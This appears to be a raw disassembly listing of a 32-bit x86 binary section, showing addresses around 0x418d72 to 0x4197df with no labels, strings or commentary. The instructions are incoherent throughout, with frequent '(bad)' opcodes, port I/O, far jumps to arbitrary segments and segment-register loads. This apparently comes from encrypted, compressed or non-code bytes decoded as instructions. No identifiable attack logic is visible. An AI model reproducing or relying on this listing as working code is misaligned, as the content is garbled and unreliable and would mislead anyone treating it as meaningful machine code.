  418d72:	xchg   esi,eax
  418d73:	pop    es
  418d74:	repnz (bad) 
  418d76:	push   eax
  418d77:	cmp    BYTE PTR [ebp+0x6b64f498],dh
  418d7d:	dec    eax
  418d7e:	cdq    
  418d7f:	push   ds
  418d80:	add    eax,0xa62c7425
  418d85:	int    0xd7
  418d87:	je     0x418de3
  418d89:	ss push esp
  418d8b:	in     al,0x4a
  418d8d:	mov    esi,edx
  418d8f:	out    dx,eax
  418d90:	les    esp,FWORD PTR [edx]
  418d92:	add    al,0xbe
  418d94:	cdq    
  418d95:	adc    BYTE PTR [esi+0x43],ch
  418d98:	sbb    DWORD PTR [ebx-0x5d],ebp
  418d9b:	pop    ebp
  418d9c:	cmp    ah,al
  418d9e:	jae    0x418dc4
  418da0:	jmp    0xccf8:0x4d1ec9d1
  418da7:	lods   al,BYTE PTR ds:[esi]
  418da8:	cmp    al,0xce
  418daa:	imul   edi,DWORD PTR [eax],0xc2be96b
  418db0:	push   ss
  418db1:	retf   0x32d6
  418db4:	xchg   BYTE PTR [eax],bl
  418db6:	leave  
  418db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db8:	(bad)  
  418db9:	jmp    0x9e5:0x73f921fa
  418dc0:	aad    0xb
  418dc2:	adc    eax,0xc1f65ebb
  418dc7:	mov    esp,0xc7fe000
  418dcc:	jae    0x418e00
  418dce:	xlat   BYTE PTR ds:[ebx]
  418dcf:	mov    ebx,0xfc96cde4
  418dd4:	scas   eax,DWORD PTR es:[edi]
  418dd5:	es and al,0xd5
  418dd8:	hlt    
  418dd9:	call   0xb88dfaaf
  418dde:	dec    ebx
  418ddf:	dec    esp
  418de0:	cli    
  418de1:	(bad)  
  418de3:	fwait
  418de4:	adc    BYTE PTR [ebx+esi*8+0x5adea448],0x8c
  418dec:	adc    eax,DWORD PTR [ebx-0x472b5f25]
  418df2:	aam    0x84
  418df4:	dec    ecx
  418df5:	adc    eax,0x40e704f4
  418dfa:	test   eax,0xfdc6f231
  418dff:	in     eax,dx
  418e00:	arpl   dx,bp
  418e02:	loopne 0x418e18
  418e04:	fst    QWORD PTR [edx]
  418e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e07:	leave  
  418e08:	or     esi,DWORD PTR [ecx+0x24b52ff5]
  418e0e:	push   edx
  418e0f:	repnz add BYTE PTR [eax],al
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x47]
  418e81:	imul   esp,DWORD PTR [ecx],0x107b068
  418e87:	add    BYTE PTR [ecx+eax*1],al
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	into   
  418e8d:	push   esp
  418e8e:	retf   0x89d0
  418e91:	mov    edx,edi
  418e93:	and    eax,DWORD PTR [ebx+0x56]
  418e96:	adc    eax,0xe29c7ea9
  418e9b:	cli    
  418e9c:	push   ds
  418e9d:	sub    ebp,ebp
  418e9f:	inc    edx
  418ea0:	imul   edi,DWORD PTR [edi+0x4d81fbf4],0xffffffe5
  418ea7:	adc    eax,0xf4110b40
  418eac:	lods   al,BYTE PTR ds:[esi]
  418ead:	das    
  418eae:	addr16 pop ss
  418eb0:	cli    
  418eb1:	push   ds
  418eb2:	cmp    bl,dl
  418eb4:	add    bh,BYTE PTR [ebx-0x39]
  418eb7:	jle    0x418ec2
  418eb9:	push   ss
  418eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ebb:	enter  0x9ff1,0x74
  418ebf:	js     0x418f31
  418ec1:	sub    dl,BYTE PTR [edx+0x25]
  418ec4:	xchg   DWORD PTR [edi-0x37],edi
  418ec7:	leave  
  418ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec9:	jle    0x418ece
  418ecb:	push   0x6d20748f
  418ed0:	fsub   st,st(1)
  418ed2:	xchg   BYTE PTR [ecx+0x13],dl
  418ed5:	dec    esi
  418ed6:	(bad)  
  418ed7:	jmp    0xfda2d6e6
  418edc:	scas   eax,DWORD PTR es:[edi]
  418edd:	into   
  418ede:	mov    ch,BYTE PTR [edx+0x45]
  418ee1:	inc    DWORD PTR [edx]
  418ee3:	cld    
  418ee4:	inc    edi
  418ee5:	cmp    dl,0xf4
  418ee8:	cli    
  418ee9:	ins    DWORD PTR es:[edi],dx
  418eea:	nop
  418eeb:	dec    esp
  418eec:	xchg   ecx,eax
  418eed:	lea    eax,[ebp+0x64]
  418ef0:	sub    BYTE PTR [eax+0x41],0x84
  418ef4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418ef6:	xchg   ebx,eax
  418ef7:	in     al,dx
  418ef8:	test   al,0x14
  418efa:	ficomp DWORD PTR [edx+0x6f]
  418efd:	mov    ch,0x47
  418eff:	fldenv [ebx-0x273a006d]
  418f05:	xchg   esi,eax
  418f06:	xor    eax,0xf6b69991
  418f0b:	loope  0x418f5a
  418f0d:	mov    ah,0xea
  418f0f:	dec    ecx
  418f10:	pop    ds
  418f11:	mov    bl,0x2d
  418f13:	mov    edi,0x7cfb56ed
  418f18:	(bad)  
  418f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f1a:	mov    fs,esi
  418f1c:	shl    ebp,0x37
  418f1f:	xor    ebx,DWORD PTR [ebx-0x61]
  418f22:	pop    edx
  418f23:	(bad)  
  418f24:	adc    al,0xfd
  418f26:	pop    ebp
  418f27:	xlat   BYTE PTR ds:[ebx]
  418f28:	iret   
  418f29:	dec    esi
  418f2a:	mov    ecx,0xc1ab071
  418f2f:	sub    ecx,DWORD PTR ds:0xa49dce82
  418f35:	sbb    esp,DWORD PTR ds:0x8b809596
  418f3b:	and    BYTE PTR [ebx],dl
  418f3d:	sbb    BYTE PTR [eax-0x44],cl
  418f40:	push   cs
  418f41:	in     al,dx
  418f42:	jbe    0x418f2c
  418f44:	or     esi,DWORD PTR [esi+0x6f030c81]
  418f4a:	lock push eax
  418f4c:	mov    esi,0xaf0f6baf
  418f51:	out    0xc0,eax
  418f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f54:	xchg   esi,eax
  418f55:	int3   
  418f56:	xor    BYTE PTR [ebx],0x69
  418f59:	and    al,0x22
  418f5b:	or     edi,DWORD PTR [esi]
  418f5d:	mov    BYTE PTR [ecx+edx*4],bl
  418f60:	outs   dx,BYTE PTR ds:[esi]
  418f61:	lahf   
  418f62:	jge    0x418eef
  418f64:	shl    DWORD PTR [edx],1
  418f66:	bound  eax,QWORD PTR [eax+0x49]
  418f69:	dec    esp
  418f6a:	add    dl,bh
  418f6c:	leave  
  418f6d:	jmp    0x418f2f
  418f6f:	inc    esp
  418f70:	and    al,0x90
  418f72:	imul   edx,DWORD PTR [ebx],0x16784647
  418f78:	mov    dh,0x86
  418f7a:	loop   0x418f58
  418f7c:	into   
  418f7d:	icebp  
  418f7e:	push   ss
  418f7f:	and    esp,edi
  418f81:	push   esi
  418f82:	sbb    BYTE PTR [ecx+0x3c787b8],ah
  418f88:	inc    esp
  418f89:	jg     0x418fef
  418f8b:	retf   0x2808
  418f8e:	ftst   
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x73eaf1a7]
  419001:	lea    edx,[ebx+0x48]
  419004:	mov    ah,0x8
  419006:	add    DWORD PTR [eax],eax
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	lahf   
  41900d:	rcr    ah,0x15
  419010:	test   al,0xfc
  419012:	jge    0x419059
  419014:	inc    esp
  419015:	out    dx,al
  419016:	retf   0xec1d
  419019:	mov    dl,0xce
  41901b:	lea    esp,[esi-0x7f]
  41901e:	int3   
  41901f:	jl     0x419040
  419021:	test   eax,0xd8169564
  419026:	call   0xdd7ea460
  41902b:	or     ah,al
  41902d:	mov    bh,0xf1
  41902f:	cmp    al,BYTE PTR [esi-0xecdf4a5]
  419035:	out    0xf4,eax
  419037:	mov    eax,0x36452cb9
  41903c:	dec    esi
  41903d:	xchg   esp,eax
  41903e:	rol    edi,1
  419040:	inc    eax
  419041:	std    
  419042:	or     DWORD PTR [eax-0x4261bb19],edx
  419048:	leave  
  419049:	jecxz  0x41906f
  41904b:	repnz pop edi
  41904d:	mov    ebp,0x477144cd
  419052:	mov    WORD PTR [edi+0x29253b42],?
  419058:	idiv   ebp
  41905a:	mov    cl,0x37
  41905c:	mov    edi,DWORD PTR [esi-0x2be9b344]
  419062:	sbb    BYTE PTR [edi+0x4],cl
  419065:	xor    DWORD PTR [esp+edi*4+0x4812ecbc],0x4a
  41906d:	or     eax,0x136a05eb
  419072:	push   0xb42b39ef
  419077:	push   edx
  419078:	clc    
  419079:	in     eax,0x8
  41907b:	fwait
  41907c:	ret    0xce0e
  41907f:	gs int3 
  419081:	aad    0x28
  419083:	sub    ebx,esi
  419085:	jo     0x41906f
  419087:	cmp    DWORD PTR [ecx],ebp
  419089:	ja     0x419033
  41908b:	pop    edi
  41908c:	mov    ecx,0x6626c614
  419091:	sub    al,0x41
  419093:	(bad)  
  419094:	mov    dh,0xb2
  419096:	xchg   ecx,eax
  419097:	js     0x4190e6
  419099:	(bad)  
  41909a:	push   cs
  41909b:	hlt    
  41909c:	rcr    BYTE PTR [ebx+eax*2-0xa],0x59
  4190a1:	cmp    al,0x5f
  4190a3:	adc    edx,esi
  4190a5:	pop    ds
  4190a6:	ins    BYTE PTR es:[edi],dx
  4190a7:	mov    gs,WORD PTR [edx]
  4190a9:	(bad)  
  4190aa:	push   esi
  4190ab:	mov    esi,0xf4a6405f
  4190b0:	in     eax,0x6
  4190b2:	push   es
  4190b3:	push   edx
  4190b4:	or     BYTE PTR ds:0x9fe9510a,bl
  4190ba:	rcl    eax,0x7f
  4190bd:	or     BYTE PTR [eax+0x8],dl
  4190c0:	mov    al,0xd7
  4190c2:	jnp    0x419123
  4190c4:	or     ah,BYTE PTR [ecx]
  4190c6:	pop    edi
  4190c7:	mov    dh,0x54
  4190c9:	push   ds
  4190ca:	cmp    BYTE PTR [edx],al
  4190cc:	sub    DWORD PTR [esi+0x3f],eax
  4190cf:	sub    DWORD PTR [ebx+0x79bfbeb3],edx
  4190d5:	data16 adc BYTE PTR ds:0x9072aee7,dh
  4190dc:	add    eax,0x387a0ec7
  4190e1:	xchg   esp,eax
  4190e2:	fidiv  WORD PTR [ecx+0x122adf02]
  4190e8:	jge    0x419100
  4190ea:	shr    DWORD PTR [ebp+edx*2-0x24332404],cl
  4190f1:	inc    ecx
  4190f2:	loopne 0x4190f4
  4190f4:	push   eax
  4190f5:	dec    esi
  4190f6:	and    edx,DWORD PTR [ecx+0xf1b2265]
  4190fc:	das    
  4190fd:	dec    ebx
  4190fe:	mov    edx,0xfd8da422
  419103:	push   ss
  419104:	xor    eax,0xb9e492ca
  419109:	push   ebp
  41910a:	addr16 js 0x4190b0
  41910d:	and    eax,0x1c11
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,ah
  419181:	dec    BYTE PTR [ebx+0x109b8f3]
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	cli    
  41918d:	sbb    al,0x3
  41918f:	adc    al,0xf1
  419191:	arpl   WORD PTR [edx-0x54791199],bx
  419197:	ins    DWORD PTR es:[edi],dx
  419198:	xor    DWORD PTR [eax-0x42c8f050],ebp
  41919e:	ins    DWORD PTR es:[edi],dx
  41919f:	push   cs
  4191a0:	outs   dx,BYTE PTR ds:[esi]
  4191a1:	popf   
  4191a2:	and    dh,ch
  4191a4:	xchg   esi,eax
  4191a5:	pop    eax
  4191a6:	adc    DWORD PTR [edx],esp
  4191a8:	dec    ebp
  4191a9:	and    DWORD PTR [edx+0x5dd5c807],ebp
  4191af:	gs jae 0x41914a
  4191b2:	call   0xbf13:0xdc46a9cb
  4191b9:	lods   al,BYTE PTR ds:[esi]
  4191ba:	xlat   BYTE PTR ds:[ebx]
  4191bb:	dec    ebx
  4191bc:	dec    edi
  4191bd:	inc    ecx
  4191be:	xor    eax,0x9c4b7a5a
  4191c3:	(bad)  
  4191c4:	cli    
  4191c5:	stc    
  4191c6:	add    eax,0xec312bac
  4191cb:	mov    ch,ch
  4191cd:	jp     0x419238
  4191cf:	jmp    0xfa53:0x5c312c41
  4191d6:	add    al,0x15
  4191d8:	out    dx,eax
  4191d9:	aaa    
  4191da:	jl     0x419234
  4191dc:	enter  0x1efa,0x1c
  4191e0:	mov    cl,0x1a
  4191e2:	ror    BYTE PTR [esi-0x1e8b3cc0],1
  4191e8:	shr    DWORD PTR [ebx+ebp*2+0x4c3b8a9b],1
  4191ef:	hlt    
  4191f0:	enter  0x709e,0xa1
  4191f4:	inc    ebx
  4191f5:	adc    BYTE PTR [edi-0x6c3eeaed],al
  4191fb:	mov    eax,ds:0x773e756a
  419200:	mov    bl,0xe8
  419202:	in     eax,0x6
  419204:	mov    ds:0x371b14d0,al
  419209:	cmp    cl,BYTE PTR [ebx]
  41920b:	fwait
  41920c:	dec    ebx
  41920d:	scas   al,BYTE PTR es:[edi]
  41920e:	mov    ds:0xecb2bc5d,eax
  419213:	hlt    
  419214:	add    ch,BYTE PTR [edx-0x53]
  419217:	out    dx,eax
  419218:	rol    BYTE PTR [eax-0x2],1
  41921b:	xor    ebp,eax
  41921d:	js     0x4191f2
  41921f:	push   ebp
  419220:	hlt    
  419221:	retf   
  419222:	xor    edi,DWORD PTR [ebx+0x2ed0bdcb]
  419228:	test   DWORD PTR [ecx-0x3c],esp
  41922b:	mov    ebx,DWORD PTR [edi+0x1c]
  41922e:	mov    al,0x39
  419230:	add    esi,ebp
  419232:	popa   
  419233:	lahf   
  419234:	sti    
  419235:	retf   0xb7b7
  419238:	xor    DWORD PTR [esi-0x28b717a6],0x72ca49e7
  419242:	cwde   
  419243:	in     eax,dx
  419244:	addr16 dec eax
  419246:	pusha  
  419247:	rcr    ebx,1
  419249:	mov    ds:0xb305bb9c,al
  41924e:	dec    edi
  41924f:	xchg   ebx,eax
  419250:	enter  0xaa02,0xf7
  419254:	mov    ah,0x97
  419256:	cs ss cmp bl,cl
  41925a:	pop    edx
  41925b:	jg     0x419243
  41925d:	sub    ebp,esp
  41925f:	ret    
  419260:	popf   
  419261:	mov    fs,WORD PTR [ebp-0x1cda9976]
  419267:	inc    ebp
  419268:	stc    
  419269:	js     0x419215
  41926b:	enter  0xea74,0xdd
  41926f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419270:	aas    
  419271:	inc    ebx
  419272:	inc    esp
  419273:	or     eax,0x396916c1
  419278:	clc    
  419279:	lods   eax,DWORD PTR ds:[esi]
  41927a:	popf   
  41927b:	ss mov eax,0xc51373c1
  419281:	mov    dl,0xdf
  419283:	shl    BYTE PTR [ecx-0x53e434d4],1
  419289:	adc    al,0x70
  41928b:	xchg   ecx,eax
  41928c:	push   eax
  41928d:	(bad)  
  41928e:	jo     0x4192d4
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	add    ch,ah
  419302:	fmul   QWORD PTR [ecx]
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [eax-0x2f1f9297],al
  419311:	in     eax,dx
  419312:	outs   dx,BYTE PTR ds:[esi]
  419313:	fst    st(5)
  419315:	pop    esi
  419316:	fs loope 0x419345
  419319:	pop    ebx
  41931a:	mov    ecx,DWORD PTR [edx*1+0x75b2af11]
  419321:	pop    ds
  419322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419323:	xchg   ecx,eax
  419324:	mov    BYTE PTR [esi+0x1f7b0c33],dh
  41932a:	lods   eax,DWORD PTR ds:[esi]
  41932b:	ret    
  41932c:	(bad)  
  41932d:	stc    
  41932e:	push   cs
  41932f:	mov    ds:0xc94ea657,eax
  419334:	add    DWORD PTR [ebx],0x290ef304
  41933a:	sbb    eax,0x15537102
  41933f:	(bad)  
  419340:	aas    
  419341:	test   esp,0x6d9a3829
  419347:	sbb    eax,0x37770e47
  41934c:	mov    ch,0x5e
  41934e:	inc    esp
  41934f:	and    al,BYTE PTR [ecx+ecx*1]
  419352:	mov    ebp,0xc1649293
  419357:	ja     0x419301
  419359:	repz dec edx
  41935b:	pop    eax
  41935c:	popa   
  41935d:	loope  0x419310
  41935f:	jg     0x419381
  419361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419362:	test   DWORD PTR [esi],edi
  419364:	xchg   BYTE PTR [ebx-0x71],dl
  419367:	cwde   
  419368:	jp     0x41932a
  41936a:	xchg   ebx,eax
  41936b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936c:	jnp    0x4192fb
  41936e:	cmp    al,0xcd
  419371:	mov    al,ds:0x6014b4e1
  419376:	sbb    BYTE PTR [ebp+0x46],al
  419379:	jbe    0x41937a
  41937b:	xor    ch,al
  41937d:	cmp    ebp,DWORD PTR [eax-0x5a89ac39]
  419383:	mov    al,0xa8
  419385:	jp     0x41934e
  419387:	mov    dh,0xb0
  419389:	cmp    ch,BYTE PTR [edi+0x35]
  41938c:	inc    ebp
  41938d:	call   0x87d6170b
  419392:	outs   dx,DWORD PTR ds:[esi]
  419393:	add    DWORD PTR [esi],esp
  419395:	mov    edi,0xfb16dd1b
  41939a:	(bad)  [edx]
  41939c:	mov    dl,0x94
  41939e:	fdiv   QWORD PTR [edx-0x4e850f2e]
  4193a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a5:	cs jbe 0x419352
  4193a8:	(bad)  
  4193a9:	jge    0x4193d0
  4193ab:	jmp    FWORD PTR [esi]
  4193ad:	mov    eax,0x3bf87a30
  4193b2:	bound  esp,QWORD PTR [edx+eax*2-0x30]
  4193b6:	mov    edx,0x1dfbb79e
  4193bb:	or     eax,0xaf566323
  4193c0:	std    
  4193c1:	in     eax,0x90
  4193c3:	xchg   ecx,eax
  4193c4:	ret    0x386b
  4193c7:	ss leave 
  4193c9:	nop
  4193ca:	jmp    FWORD PTR [edi]
  4193cc:	in     eax,0x8b
  4193ce:	push   ds
  4193cf:	fldcw  WORD PTR gs:[ebx-0x9]
  4193d3:	gs aam 0x4a
  4193d6:	dec    ecx
  4193d7:	cmp    al,0x5c
  4193d9:	mov    edx,0xa41dbe51
  4193de:	sahf   
  4193df:	(bad)  
  4193e0:	adc    eax,0x50005552
  4193e5:	push   ebp
  4193e6:	fild   QWORD PTR [ebx]
  4193e8:	push   esi
  4193e9:	clc    
  4193ea:	js     0x419403
  4193ec:	sub    dh,BYTE PTR [edi+eax*1-0x6ef5b4bb]
  4193f3:	inc    eax
  4193f4:	push   ecx
  4193f5:	(bad)  [esi+0x5c55a215]
  4193fb:	push   ebx
  4193fc:	stc    
  4193fd:	outs   dx,DWORD PTR ds:[esi]
  4193fe:	xchg   esi,eax
  4193ff:	imul   esp,ebp,0xffffffcd
  419402:	xor    BYTE PTR [esp+ebx*2],0x1f
  419406:	fild   QWORD PTR [edi+0x21]
  419409:	dec    ecx
  41940a:	stos   DWORD PTR es:[edi],eax
  41940b:	rcl    esi,cl
  41940d:	das    
  41940e:	loop   0x419478
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	stc    
  419481:	mov    al,ds:0xbc0a142
  419486:	add    DWORD PTR [eax],eax
  419488:	add    al,0x1
  41948a:	add    BYTE PTR [eax],al
  41948c:	mov    bl,0x6a
  41948e:	mov    WORD PTR [edi-0x36],es
  419491:	mov    bh,0x47
  419493:	push   ecx
  419494:	idiv   BYTE PTR [edx-0x2a3f92da]
  41949a:	jae    0x41949a
  41949c:	test   eax,0x26e8d693
  4194a1:	push   ds
  4194a2:	in     eax,dx
  4194a3:	or     DWORD PTR [eax-0x1f],edx
  4194a6:	(bad)  
  4194a7:	aam    0xee
  4194a9:	or     BYTE PTR [ebp+0x49b08c04],dl
  4194af:	fbld   TBYTE PTR [esi-0x78b35f68]
  4194b5:	addr16 pop edx
  4194b7:	test   eax,0xeaa067fd
  4194bc:	add    eax,0x6869dd04
  4194c1:	mov    bh,0xb5
  4194c3:	ins    BYTE PTR es:[edi],dx
  4194c4:	sbb    al,0x9c
  4194c6:	add    edx,DWORD PTR [edx+0x32]
  4194c9:	dec    esi
  4194ca:	add    cl,BYTE PTR [edx+0x30]
  4194cd:	add    eax,0x12921766
  4194d2:	cs popf 
  4194d4:	shl    cl,0x7a
  4194d7:	xacquire xchg BYTE PTR [ecx-0x77498e5d],bl
  4194de:	dec    eax
  4194df:	dec    ecx
  4194e0:	cmp    al,0xd9
  4194e2:	sbb    ebx,DWORD PTR [ebx+0x3212fb8b]
  4194e8:	add    ecx,ecx
  4194ea:	and    dh,ch
  4194ec:	inc    ebp
  4194ed:	test   eax,0x817a993e
  4194f2:	daa    
  4194f3:	fldcw  WORD PTR [edx]
  4194f5:	push   ebp
  4194f6:	ret    0x564
  4194f9:	cmp    DWORD PTR [edi-0x5b],edx
  4194fc:	pop    ebp
  4194fd:	dec    ebp
  4194fe:	aaa    
  4194ff:	ret    0x93a1
  419502:	lods   eax,DWORD PTR ds:[esi]
  419503:	jns    0x41953b
  419505:	ins    DWORD PTR es:[edi],dx
  419506:	cmp    eax,DWORD PTR [esi]
  419508:	push   0x2edc7545
  41950d:	mov    bl,cl
  41950f:	scas   eax,DWORD PTR es:[edi]
  419510:	stos   DWORD PTR es:[edi],eax
  419511:	jno    0x419500
  419513:	test   DWORD PTR [edi],0x21148989
  419519:	and    eax,0xe0090344
  41951e:	in     eax,dx
  41951f:	sub    edx,eax
  419521:	ja     0x4194f3
  419523:	mov    edi,0xc5007c4e
  419528:	inc    eax
  419529:	mov    edi,DWORD PTR [edi-0x6037da3]
  41952f:	aad    0x6a
  419531:	daa    
  419532:	out    0xed,eax
  419534:	ins    BYTE PTR es:[edi],dx
  419535:	push   ebp
  419536:	inc    ebx
  419537:	sub    edx,DWORD PTR [ecx]
  419539:	popa   
  41953a:	pop    ebx
  41953b:	mov    ah,0x6e
  41953d:	push   ss
  41953e:	js     0x419588
  419540:	stos   BYTE PTR es:[edi],al
  419541:	retf   0x8553
  419544:	push   0x3b9ac16d
  419549:	push   edi
  41954a:	inc    ebp
  41954b:	ficomp WORD PTR [edi-0x2fc53d99]
  419551:	jmp    0x328f:0xb1435ef1
  419558:	daa    
  419559:	cdq    
  41955a:	rcr    DWORD PTR [eax-0x1e0a1da6],0xa1
  419561:	pop    ss
  419562:	jp     0x4195be
  419564:	mov    bh,0xe4
  419566:	xchg   ebx,eax
  419567:	jle    0x419527
  419569:	xchg   BYTE PTR [eax-0xa879fb7],bh
  41956f:	(bad)  
  419570:	and    DWORD PTR [esi],ecx
  419572:	das    
  419573:	in     al,dx
  419574:	pop    ebp
  419575:	mov    bh,0x3d
  419577:	lea    edi,[ecx+0x528811a3]
  41957d:	mov    ds:0x422e4915,eax
  419582:	mov    bl,0x26
  419584:	mov    ah,0x70
  419586:	sub    DWORD PTR [esi-0x27eff33f],0x3d315660
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	sbb    edx,DWORD PTR [edi]
  419602:	fwait
  419603:	cdq    
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	and    eax,0xa9a9982f
  419611:	outs   dx,BYTE PTR ds:[esi]
  419612:	xor    BYTE PTR [eax+0x13934904],ah
  419618:	dec    ecx
  419619:	sub    bh,dl
  41961b:	pop    esp
  41961c:	dec    ebp
  41961d:	out    0x8d,al
  41961f:	mov    esp,0xacb4f18b
  419624:	adc    edi,DWORD PTR [eax+0x7f2b9585]
  41962a:	push   ds
  41962b:	mov    ecx,0xdd06cdd9
  419630:	xor    ebp,esp
  419632:	test   DWORD PTR [ecx],0xfa4a30ed
  419638:	dec    esi
  419639:	push   esp
  41963a:	out    dx,eax
  41963b:	mov    ebx,0xc40c5990
  419640:	out    0x8b,eax
  419642:	mov    WORD PTR ds:0x6d7a1e19,fs
  419648:	xchg   ebp,eax
  419649:	or     BYTE PTR [edx+ebx*1+0x4e0cf746],ch
  419650:	or     ah,BYTE PTR [edi]
  419652:	adc    DWORD PTR [edi-0x1c],ebx
  419655:	dec    esp
  419656:	mov    WORD PTR [ebp-0x2a],ds
  419659:	iret   
  41965a:	les    eax,FWORD PTR [ebx-0x28]
  41965d:	fs out dx,al
  41965f:	adc    al,0xc2
  419661:	dec    esi
  419662:	imul   ebx,DWORD PTR [ecx+0x78742da5],0xffffffb3
  419669:	pop    ecx
  41966a:	call   0xd04d:0xc4eeb730
  419671:	push   edi
  419672:	das    
  419673:	jns    0x41967b
  419675:	sbb    al,0x32
  419677:	test   al,0xd3
  419679:	push   ecx
  41967a:	outs   dx,DWORD PTR ds:[esi]
  41967b:	mov    ds:0x85c475b5,eax
  419680:	aam    0x1
  419682:	retf   0x12b6
  419685:	xchg   edi,eax
  419686:	fisub  DWORD PTR [ebx+ebx*1+0x2a]
  41968a:	xchg   ebx,eax
  41968b:	xor    ebp,ecx
  41968d:	(bad)  
  41968e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41968f:	lock mov edi,0x7bb2ee70
  419695:	popa   
  419696:	pushf  
  419697:	ins    DWORD PTR es:[edi],dx
  419698:	or     eax,0x8274f7b5
  41969d:	adc    al,0xc5
  41969f:	fistp  WORD PTR [edx-0x4b]
  4196a2:	adc    BYTE PTR [esi],dl
  4196a4:	inc    edx
  4196a5:	mov    al,0x7e
  4196a7:	inc    ecx
  4196a8:	sub    eax,0x9f8e4812
  4196ad:	mov    ds,esi
  4196af:	int    0x4a
  4196b1:	pop    ecx
  4196b2:	jnp    0x419651
  4196b4:	das    
  4196b5:	test   bh,bl
  4196b7:	test   BYTE PTR [ebp+0x2d],ch
  4196ba:	ins    DWORD PTR es:[edi],dx
  4196bb:	xlat   BYTE PTR ds:[ebx]
  4196bc:	or     bl,al
  4196be:	mov    esi,0xbdc7c6dc
  4196c3:	or     eax,0x6414bd0f
  4196c8:	les    ebx,FWORD PTR [ebx-0x71]
  4196cb:	popf   
  4196cc:	cmp    ah,BYTE PTR [ecx-0x71]
  4196cf:	aam    0xa
  4196d1:	adc    al,0xf6
  4196d3:	dec    esi
  4196d4:	addr16 mov eax,ds:0x45c2
  4196d8:	div    DWORD PTR [esp+ebx*2-0x77]
  4196dc:	retf   
  4196dd:	arpl   sp,cx
  4196df:	or     eax,0x1dbace68
  4196e4:	push   eax
  4196e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e6:	(bad)  ds:0xe5b4adfa
  4196ec:	cld    
  4196ed:	mov    edi,0x58900dcd
  4196f2:	inc    ecx
  4196f3:	xor    ebx,DWORD PTR [ebp+0x1b759295]
  4196f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196fa:	call   FWORD PTR [ebx+0x1a]
  4196fd:	inc    ebx
  4196fe:	jl     0x4196fe
  419700:	scas   al,BYTE PTR es:[edi]
  419701:	retf   0xe965
  419704:	out    dx,al
  419705:	add    al,0xe3
  419707:	lods   eax,DWORD PTR ds:[esi]
  419708:	pop    ebp
  419709:	xchg   BYTE PTR [esp+esi*8],dh
  41970c:	mov    eax,ds:0x715c11
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x68dd0ae
  419781:	lahf   
  419782:	mov    cs,WORD PTR ds:0x10dc8
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	jmp    0x7fe3:0xd5206cc0
  419793:	clc    
  419794:	iret   
  419795:	sub    BYTE PTR [edi-0x3f],cl
  419798:	or     edx,DWORD PTR [esi]
  41979a:	pop    ss
  41979b:	xchg   ecx,eax
  41979c:	dec    edx
  41979d:	test   BYTE PTR [edx],bh
  41979f:	cmp    bl,ch
  4197a1:	test   eax,0xb839fe35
  4197a6:	jo     0x4197dc
  4197a8:	retf   
  4197a9:	inc    ebx
  4197aa:	shl    BYTE PTR [edx-0x7ab75a6e],0xf4
  4197b1:	leave  
  4197b2:	popf   
  4197b3:	(bad)  
  4197b4:	dec    edi
  4197b5:	push   ebp
  4197b6:	and    al,0xaa
  4197b8:	adc    al,0x3a
  4197ba:	xor    edx,DWORD PTR [esi]
  4197bc:	ss stos DWORD PTR es:[edi],eax
  4197be:	mov    dl,0x2c
  4197c0:	pop    edi
  4197c1:	pushf  
  4197c2:	xor    dl,BYTE PTR [edx]
  4197c4:	fisttp WORD PTR [eax+0x11bbf3cc]
  4197ca:	daa    
  4197cb:	mov    ebp,0x1592e349
  4197d0:	inc    esi
  4197d1:	xor    eax,0x6813d6da
  4197d6:	xchg   edi,eax
  4197d7:	mov    esp,0xccb3fb6d
  4197dc:	jo     0x41982c
  4197de:	pop    edx
  4197df:	adc    ecx,DWORD PTR [esp+ecx*8+0x19]
